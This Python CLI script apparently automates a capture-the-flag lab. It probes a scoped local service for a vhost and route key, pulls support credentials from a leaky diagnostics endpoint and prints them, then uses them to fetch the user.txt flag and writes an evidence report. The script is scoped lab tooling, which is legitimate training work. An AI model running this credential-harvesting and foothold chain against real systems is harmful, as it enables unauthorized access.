"""CLI entry point: orchestrate discovery, probe, normalize, report."""
from __future__ import annotations

import argparse
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

from recon_engine.ledger import Ledger
from recon_engine.normalize import Observation, write_assets, write_report, write_run_meta
from recon_engine.probe import get_user_txt, http_probe, parse_signal_route, signal_probe
from recon_engine.scope import Scope


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def main() -> int:
    parser = argparse.ArgumentParser(description="EH-A1 Recon Engine")
    parser.add_argument("--target", required=True, help="Target IP (usually 127.0.0.1)")
    parser.add_argument("--scope", required=True, type=Path, help="Path to scope.csv")
    parser.add_argument("--output", required=True, type=Path, help="Output directory")
    parser.add_argument("--rate", type=int, default=25, help="Max requests per second")
    args = parser.parse_args()

    start_time = utc_now()
    output_dir = args.output.resolve()
    output_dir.mkdir(parents=True, exist_ok=True)

    # Load scope and assignment
    scope = Scope(args.scope)
    assignment_path = args.scope.parent / "assignment.json"
    assignment = json.loads(assignment_path.read_text(encoding="utf-8")) if assignment_path.exists() else {}

    # Init ledger
    ledger = Ledger(output_dir / "ledger.db")
    observations: list[Observation] = []

    # Get allowed endpoints from scope
    allowed = scope.get_allowed()
    if not allowed:
        print("ERROR: No allowed endpoints in scope", file=sys.stderr)
        write_run_meta(vars(args), start_time, utc_now(), "no_scope", output_dir / "run.json")
        return 1

    # Identify web and signal ports from assignment
    web_port = None
    signal_port = None
    for host, port in allowed:
        if assignment.get("entry_url", "").endswith(f":{port}/"):
            web_port = port
        elif port != web_port and signal_port is None:
            signal_port = port

    # Fallback
    if web_port is None:
        web_port = allowed[0][1]
    if signal_port is None and len(allowed) > 1:
        signal_port = allowed[1][1]

    target = args.target

    # === PHASE 1: Signal Service Discovery ===
    print(f"[*] Probing signal service on {target}:{signal_port}")

    caps_resp = signal_probe(target, signal_port, "CAPS", scope=scope, ledger=ledger)
    if caps_resp:
        print(f"[+] CAPS: {caps_resp}")
        observations.append(Observation(
            target=target, port=signal_port, protocol="tcp",
            service="signal", notes=f"CAPS response: {caps_resp}",
            source_file="signal_probe"
        ))

    route_resp = signal_probe(target, signal_port, "ROUTE", scope=scope, ledger=ledger)
    if not route_resp:
        print("ERROR: Could not get ROUTE from signal service", file=sys.stderr)
        write_run_meta(vars(args), start_time, utc_now(), "no_route", output_dir / "run.json")
        return 1

    print(f"[+] ROUTE: {route_resp}")
    route_data = parse_signal_route(route_resp)
    vhost = route_data.get("route", "")
    route_key = route_data.get("proof", "")

    observations.append(Observation(
        target=target, port=signal_port, protocol="tcp",
        service="signal", notes=f"ROUTE: vhost={vhost}, route_key={route_key}",
        source_file="signal_probe"
    ))

    # === PHASE 2: HTTP Discovery with VHost ===
    print(f"[*] Probing HTTP service on {target}:{web_port} with Host: {vhost}")

    root = http_probe(target, web_port, "/", headers={"Host": vhost},
                     scope=scope, ledger=ledger, output_dir=output_dir)
    if root:
        print(f"[+] Root: {root.status}")
        observations.append(Observation(
            target=target, port=web_port, protocol="http",
            service="http", status=root.status,
            notes=f"Root with vhost {vhost}", source_file=root.raw_path or ""
        ))

    robots = http_probe(target, web_port, "/robots.txt", headers={"Host": vhost},
                       scope=scope, ledger=ledger, output_dir=output_dir)
    if robots:
        print(f"[+] robots.txt: {robots.status}")
        observations.append(Observation(
            target=target, port=web_port, protocol="http",
            service="http", status=robots.status,
            notes=f"robots.txt: {robots.body[:100]}", source_file=robots.raw_path or ""
        ))

    diag = http_probe(target, web_port, "/ops-diagnostics", headers={"Host": vhost},
                     scope=scope, ledger=ledger, output_dir=output_dir)
    if not diag or diag.status != 200:
        print("ERROR: Could not retrieve ops-diagnostics", file=sys.stderr)
        write_run_meta(vars(args), start_time, utc_now(), "no_diagnostics", output_dir / "run.json")
        return 1

    print(f"[+] ops-diagnostics: {diag.status}")
    try:
        diag_data = json.loads(diag.body)
        username = diag_data.get("support_user", "")
        password = diag_data.get("support_password", "")
        signal_service = diag_data.get("signal_service", signal_port)
        print(f"[+] Credentials: {username} / {password}")
        print(f"[+] Signal service confirmed: {signal_service}")
    except json.JSONDecodeError:
        print("ERROR: Invalid JSON in ops-diagnostics", file=sys.stderr)
        write_run_meta(vars(args), start_time, utc_now(), "bad_diagnostics", output_dir / "run.json")
        return 1

    observations.append(Observation(
        target=target, port=web_port, protocol="http",
        service="http", status=diag.status,
        notes=f"ops-diagnostics: user={username}, signal={signal_service}",
        source_file=diag.raw_path or ""
    ))

    # === PHASE 3: Foothold ===
    print(f"[*] Retrieving user.txt with credentials and route key")
    flag = get_user_txt(
    target,
    web_port,
    username,
    password,
    route_key,
    vhost,
    scope=scope,
    ledger=ledger,
    output_dir=output_dir,
)

    if not flag:
        print("ERROR: Could not retrieve user.txt", file=sys.stderr)
        write_run_meta(vars(args), start_time, utc_now(), "no_foothold", output_dir / "run.json")
        return 1

    print(f"[+] FLAG: {flag}")
    observations.append(Observation(
        target=target, port=web_port, protocol="http",
        service="foothold", status=200,
        notes="user.txt obtained", confidence="high",
        source_file="get_user_txt"
    ))

    # === PHASE 4: Write Outputs ===
    print(f"[*] Writing outputs to {output_dir}")

    write_assets(observations, output_dir / "normalized" / "assets.jsonl")
    write_report(observations, flag, assignment, output_dir / "report.html")
    write_run_meta(vars(args), start_time, utc_now(), "success", output_dir / "run.json")

    ledger.export_csv(output_dir / "request-ledger.csv")
    ledger.to_jsonl(output_dir / "request-ledger.jsonl")

    # Build foothold evidence text using join to avoid newline issues
    evidence_lines = [
        f"Flag: {flag}",
        f"VHost: {vhost}",
        f"Route Key: {route_key}",
        f"Username: {username}",
        f"Signal Port: {signal_port}",
        f"Web Port: {web_port}",
    ]
    (output_dir / "foothold-evidence.txt").write_text(
        "\n".join(evidence_lines) + "\n",
        encoding="utf-8"
    )

    print(f"[+] Done. Request count: {ledger.get_completed_count()}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
